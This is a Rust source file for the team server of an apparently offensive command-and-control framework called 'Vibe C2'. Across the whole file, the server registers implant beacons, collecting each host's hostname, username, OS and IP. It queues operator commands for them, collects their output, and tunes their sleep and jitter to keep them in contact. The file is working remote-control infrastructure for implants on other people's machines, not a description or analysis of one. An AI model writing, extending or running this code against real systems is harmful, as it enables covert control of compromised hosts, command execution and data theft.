use anyhow::Result;
use axum::{
    extract::{Json, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Router,
};
use serde::{Deserialize, Serialize};
use clap::Parser;
use colored::*;
use vibe_c2::{
    BeaconInfo, BeaconRegistration, Command, CommandResponse, CommandResult, Task, routes, generate_id,
};
use std::{
    collections::HashMap,
    net::SocketAddr,
    sync::{Arc, Mutex},
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use tokio::sync::mpsc;
use tracing::{info, Level};
use tracing_subscriber::FmtSubscriber;

/// Command line arguments for the Team Server
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Port to listen on
    #[arg(short, long, default_value_t = 8080)]
    port: u16,
}

/// State shared between all server routes
struct ServerState {
    beacons: Mutex<HashMap<String, BeaconInfo>>,
    tasks: Mutex<HashMap<String, Vec<Task>>>,
    responses: Mutex<Vec<CommandResponse>>,
    operator_tx: mpsc::Sender<String>,
    // Track the last time a beacon checked in
    last_seen: Mutex<HashMap<String, u64>>,
}

/// Enhanced check-in request that can also include command output/response
#[derive(Debug, Deserialize, Serialize)]
struct CheckInRequest {
    beacon_id: String,
    /// Optional command response included with check-in
    response: Option<CommandResponse>,
}

// Constants for beacon management
const STALE_BEACON_THRESHOLD: u64 = 120; // 2 minutes (timeout before marking a beacon as stale)

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    // Display colorful ASCII art banner
    println!("{}\n", "
██╗   ██╗██╗██████╗ ███████╗     ██████╗██████╗ 
██║   ██║██║██╔══██╗██╔════╝    ██╔════╝╚════██╗
██║   ██║██║██████╔╝█████╗      ██║      █████╔╝
╚██╗ ██╔╝██║██╔══██╗██╔══╝      ██║     ██╔═══╝ 
 ╚████╔╝ ██║██████╔╝███████╗    ╚██████╗███████╗
  ╚═══╝  ╚═╝╚═════╝ ╚══════╝     ╚═════╝╚══════╝".bright_cyan());
    println!("{}", "        Modern Command & Control Framework".bright_blue().bold());
    println!("{}", "            🌊 TEAM SERVER EDITION 🌊\n".bright_cyan().bold());
    
    info!("{}", "Starting Vibe C2 Team Server...".bright_cyan().bold());
    
    let args = Args::parse();
    let addr = SocketAddr::from(([0, 0, 0, 0], args.port));
    
    // Channel for operator communication
    let (tx, mut rx) = mpsc::channel(100);
    
    let state = Arc::new(ServerState {
        beacons: Mutex::new(HashMap::new()),
        tasks: Mutex::new(HashMap::new()),
        responses: Mutex::new(Vec::new()),
        operator_tx: tx,
        last_seen: Mutex::new(HashMap::new()),
    });
    
    // Process operator messages in background
    let _state_clone = Arc::clone(&state);
    tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            info!("Operator message: {}", message);
        }
    });
    
    // Background task to check for stale beacons
    let stale_checker_state = Arc::clone(&state);
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(30)); // Check every 30 seconds
        loop {
            interval.tick().await;
            check_for_stale_beacons(&stale_checker_state);
        }
    });
    
    
    
    // Create the router with endpoints for both Rust and Go beacons
    let app = Router::new()
        // Common endpoints for both beacon types
        .route(routes::REGISTER, post(register_beacon))
        .route(routes::CHECK_IN, post(beacon_check_in))
        .route(routes::BEACONS, get(list_beacons))
        .route(routes::TASKS, post(create_task))
        .route(routes::GET_RESPONSES, post(get_responses))
        
        // Original Rust beacon endpoints
        .route(routes::RESPONSES, post(beacon_response))
        
        // Go beacon compatibility endpoints
        .route(routes::COMMAND_OUTPUT, post(command_output))
        .route(routes::UPDATE_CONFIG, post(update_beacon_config))
        
        .with_state(state);
    
    // Start the server
    info!("{} {}", "Vibe C2 Team Server listening on".bright_cyan().bold(), 
          addr.to_string().blue().underline());
    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await?;
    
    Ok(())
}

/// Register a new beacon
async fn register_beacon(
    State(state): State<Arc<ServerState>>,
    Json(registration): Json<BeaconRegistration>,
) -> impl IntoResponse {
    let beacon_id = generate_id();
    
    let beacon_info = BeaconInfo {
        id: beacon_id.clone(),
        hostname: registration.hostname.clone(),
        username: registration.username.clone(),
        os: registration.os.clone(),
        ip: registration.ip.clone(),
        sleep_time: Duration::from_secs(30), // Default 30 seconds
        jitter_percent: 20, // Default 20% jitter
        last_check_in: Some(timestamp()),
        terminated: false,
        stale: false,
    };
    
    info!("{} {}", "New beacon registered:".bright_green().bold(), 
          beacon_id.bright_white());
    state.beacons.lock().unwrap().insert(beacon_id.clone(), beacon_info);
    state.tasks.lock().unwrap().insert(beacon_id.clone(), Vec::new());
    
    // Notify operator
    let _ = state.operator_tx.send(format!("New beacon: {}", beacon_id)).await;
    
    Json(beacon_id)
}

/// Handle beacon check-in and return any pending tasks
async fn beacon_check_in(
    State(state): State<Arc<ServerState>>,
    Json(check_in): Json<CheckInRequest>,
) -> impl IntoResponse {
    info!("🔔 Beacon check-in received from {}", check_in.beacon_id.bright_green().bold());
    
    let beacon_id = check_in.beacon_id.clone();
    
    // Check if beacon exists and update its status
    let mut beacons = state.beacons.lock().unwrap();
    if let Some(beacon) = beacons.get_mut(&beacon_id) {
        // Update last check-in time and mark as active (not stale)
        beacon.last_check_in = Some(timestamp());
        beacon.stale = false;
        
        info!("✅ Updated last check-in time for beacon {}", beacon_id.bright_green());
        
        // Update last seen timestamp in the separate map
        let mut last_seen = state.last_seen.lock().unwrap();
        last_seen.insert(beacon_id.clone(), timestamp());
        
        // If a response was included with the check-in, store it
        if let Some(response) = check_in.response {
            let mut responses = state.responses.lock().unwrap();
            responses.push(response);
            info!("📦 Stored command response from beacon {}", beacon_id.bright_green());
        }
    } else {
        // Unknown beacon ID
        info!("❌ Unknown beacon ID: {}", beacon_id.bright_red());
        return (StatusCode::NOT_FOUND, "Unknown beacon ID").into_response();
    }
    
    // Get pending tasks for this beacon
    info!("🔐 Looking for tasks for beacon {}", beacon_id.bright_green());
    
    let mut tasks_lock = state.tasks.lock().unwrap();
    let tasks = tasks_lock.entry(beacon_id.clone()).or_insert(Vec::new());
    
    // Get all tasks and log them
    let pending_tasks = if tasks.is_empty() {
        info!("🟡 No tasks found for beacon {}", beacon_id.bright_yellow());
        Vec::new()
    } else {
        info!("🟢 Found {} tasks for beacon {}", tasks.len(), beacon_id.bright_green());
        
        // Take all pending tasks
        let pending = std::mem::take(tasks);
        
        info!("{} {} {}", "Beacon".cyan(), 
          beacon_id.bright_green().bold(), 
          format!("checked in, sending {} tasks", pending.len()).cyan());
          
        // Debug: Log the tasks being sent to the Go beacon
        if !pending.is_empty() {
            info!("{} {}", "👉".bright_yellow(), "Sending tasks to beacon:".bright_blue());
            for (index, task) in pending.iter().enumerate() {
                let task_json = serde_json::to_string_pretty(task).unwrap_or_default();
                info!("Task {} ID {}: {}\n{}", 
                     index + 1, 
                     task.id.bright_green(),
                     format!("command: {:?}", task.command).yellow(),
                     task_json.bright_white());
            }
        }
        
        pending
    };
    
    // Return the tasks to the beacon
    (StatusCode::OK, Json(pending_tasks)).into_response()
}

/// Structure for routing command output from Go beacons
#[derive(Debug, Deserialize, Serialize)]
struct CommandOutput {
    beacon_id: String,
    output: String,
    task_id: String,
}

/// Simple handler for Rust beacon responses
async fn beacon_response(
    State(state): State<Arc<ServerState>>,
    Json(response): Json<CommandResponse>,
) -> StatusCode {
    info!("{} {} {}", 
          "Response received from beacon".bright_blue().bold(), 
          response.beacon_id.bright_green(), 
          format!("for task: {}", response.id).bright_white());
    
    // Store the response
    state.responses.lock().unwrap().push(response.clone());
    
    // Update last seen time
    state.last_seen.lock().unwrap().insert(response.beacon_id.clone(), timestamp());
    
    StatusCode::OK
}

/// Route command output from Go beacons to the operator
async fn command_output(
    State(state): State<Arc<ServerState>>,
    Json(output): Json<CommandOutput>,
) -> StatusCode {
    info!("{} {} {}", 
          "Go beacon command output received".bright_blue().bold(), 
          output.beacon_id.bright_green(), 
          format!("for task: {}", output.task_id).bright_white());
    
    // Create a command response and store it
    let response = CommandResponse {
        id: output.task_id.clone(),
        beacon_id: output.beacon_id.clone(),
        result: CommandResult::Success(output.output.clone()),
    };
    
    // Store the response
    state.responses.lock().unwrap().push(response.clone());
    
    // Update last seen time
    state.last_seen.lock().unwrap().insert(output.beacon_id.clone(), timestamp());
    
    // Notify operator
    let _ = state.operator_tx.try_send(format!("Command output from Go beacon {}: {}", output.beacon_id, output.output));
    
    // Mark beacon as stale when it's terminated
    if output.output.contains("Beacon terminating") {
        info!("{} {}", "🚫 Marking terminated beacon as stale:".yellow().bold(), output.beacon_id.bright_yellow());
        let mut beacons = state.beacons.lock().unwrap();
        if let Some(beacon) = beacons.get_mut(&output.beacon_id) {
            beacon.stale = true;
            let _ = state.operator_tx.try_send(format!("Beacon {} marked as stale (terminated)", output.beacon_id));
        }
    }
    
    info!("{} {}", "✅ Successfully processed Go beacon command output".green().bold(), "");
    StatusCode::OK
}

/// List all registered beacons
async fn list_beacons(
    State(state): State<Arc<ServerState>>,
) -> impl IntoResponse {
    let beacons = state.beacons.lock().unwrap();
    let beacons_vec: Vec<BeaconInfo> = beacons.values().cloned().collect();
    
    Json(beacons_vec)
}

/// Create a new task for a beacon
async fn create_task(
    State(state): State<Arc<ServerState>>,
    Json(task_request): Json<(String, Command)>,
) -> impl IntoResponse {
    let (beacon_id, command) = task_request;
    
    info!("🚨 🚨 CREATING TASK FOR BEACON {}", beacon_id.bright_green().bold());
    
    // Check if beacon exists
    let beacons = state.beacons.lock().unwrap();
    
    // Debug log all registered beacons
    info!("📊 Currently registered beacons: ");
    for (id, info) in beacons.iter() {
        info!("  • Beacon: {} | {}", id.bright_green(), info.hostname.bright_blue());
    }
    
    if !beacons.contains_key(&beacon_id) {
        info!("❌ Beacon {} not found in registry", beacon_id.bright_red());
        return (StatusCode::NOT_FOUND, "Beacon not found").into_response();
    }
    
    info!("✅ Beacon {} found, creating task", beacon_id.bright_green());
    
    // Create the task
    let task = Task {
        id: generate_id(),
        beacon_id: beacon_id.clone(),
        command,
        timestamp: timestamp(),
    };
    
    // Serialize task for debugging
    let task_json = serde_json::to_string_pretty(&task).unwrap_or_else(|_| "<serialization error>".to_string());
    
    info!("{} {} {}", "Created new task for beacon".yellow().bold(), 
          beacon_id.bright_green(), 
          format!("command: {:?}", task.command).bright_white());
    
    // Extra debug for Go beacons
    info!("{} {}", "📦".green(), "Task JSON format:".bright_cyan());
    info!("{}", task_json.bright_white());
    
    // Debug the tasks hashmap before insertion
    let mut tasks_lock = state.tasks.lock().unwrap();
    
    info!("🔑 Current task queue state before insertion:");
    for (bid, tasks) in tasks_lock.iter() {
        info!("  • Beacon {}: {} pending tasks", bid.bright_yellow(), tasks.len());
    }
    
    // Store the task
    tasks_lock
        .entry(beacon_id.clone())
        .or_insert(Vec::new())
        .push(task.clone());
        
    // Verify task was added properly
    info!("🔑 Task queue state AFTER insertion:");
    for (bid, tasks) in tasks_lock.iter() {
        info!("  • Beacon {}: {} pending tasks", bid.bright_yellow(), tasks.len());
        if bid == &beacon_id {
            for (idx, t) in tasks.iter().enumerate() {
                info!("    - Task {}: ID {} | Command: {:?}", 
                    idx+1, t.id.bright_magenta(), t.command);
            }
        }
    }
    
    info!("🟢 Task creation complete, ID: {}", task.id.bright_green());
    (StatusCode::CREATED, Json(task)).into_response()
}

/// Get responses for a specific beacon
async fn get_responses(
    State(state): State<Arc<ServerState>>,
    Json(beacon_id): Json<String>,
) -> impl IntoResponse {
    // Get all responses for this beacon
    let responses = state.responses.lock().unwrap();
    let beacon_responses: Vec<CommandResponse> = responses
        .iter()
        .filter(|resp| resp.beacon_id == beacon_id)
        .cloned()
        .collect();
    
    if beacon_responses.is_empty() {
        info!("No responses found for beacon {}", beacon_id);
        return (StatusCode::OK, Json(Vec::<CommandResponse>::new())).into_response();
    }
    
    info!("Returning {} responses for beacon {}", beacon_responses.len(), beacon_id);
    (StatusCode::OK, Json(beacon_responses)).into_response()
}

/// Get current Unix timestamp
fn timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards")
        .as_secs()
}

/// Check for beacons that haven't checked in recently and mark them as stale
fn check_for_stale_beacons(state: &Arc<ServerState>) {
    let current_time = timestamp();
    let mut beacons = state.beacons.lock().unwrap();
    
    for (beacon_id, beacon) in beacons.iter_mut() {
        if let Some(last_checkin) = beacon.last_check_in {
            // If beacon hasn't checked in for more than the threshold, mark it as stale
            if current_time - last_checkin > STALE_BEACON_THRESHOLD && !beacon.stale {
                beacon.stale = true;
                info!("{} Beacon {} marked as stale (last seen {} seconds ago)", 
                      "⚠️".yellow(), 
                      beacon_id.bright_yellow(), 
                      current_time - last_checkin);
                
                // Notify operator about the stale beacon
                let message = format!("⚠️ Beacon {} is now stale (last seen {} seconds ago)", 
                                     beacon_id, current_time - last_checkin);
                if let Err(e) = state.operator_tx.try_send(message) {
                    info!("Failed to send stale beacon notification: {}", e);
                }
            }
        }
    }
}

/// Structure for beacon configuration updates from Go beacons
#[derive(Debug, Deserialize, Serialize)]
struct BeaconConfigUpdate {
    beacon_id: String,
    sleep_time: u64,
    jitter_percent: u8,
}

/// Update a beacon's configuration settings
async fn update_beacon_config(
    State(state): State<Arc<ServerState>>,
    Json(config): Json<BeaconConfigUpdate>,
) -> StatusCode {
    info!("{} {} {}", 
          "Beacon config update request from".bright_blue().bold(), 
          config.beacon_id.bright_green(), 
          format!("sleep={}, jitter={}", config.sleep_time, config.jitter_percent).bright_white());
    
    // Try to find and update the beacon
    let mut beacons = state.beacons.lock().unwrap();
    
    if let Some(beacon) = beacons.get_mut(&config.beacon_id) {
        // Update the beacon configuration
        beacon.sleep_time = Duration::from_secs(config.sleep_time);
        beacon.jitter_percent = config.jitter_percent;
        
        info!("{} {} {}", 
              "Updated beacon config for".green().bold(), 
              config.beacon_id.bright_green(), 
              format!("sleep={:?}, jitter={}%", beacon.sleep_time, beacon.jitter_percent).bright_white());
        
        // Notify operator
        let _ = state.operator_tx.try_send(format!("Beacon {} updated config: sleep={} seconds, jitter={}%", 
                                                 config.beacon_id, config.sleep_time, config.jitter_percent));
        
        StatusCode::OK
    } else {
        // Beacon not found
        info!("{} {}", "Beacon not found for config update:".red().bold(), config.beacon_id.bright_red());
        StatusCode::NOT_FOUND
    }
}
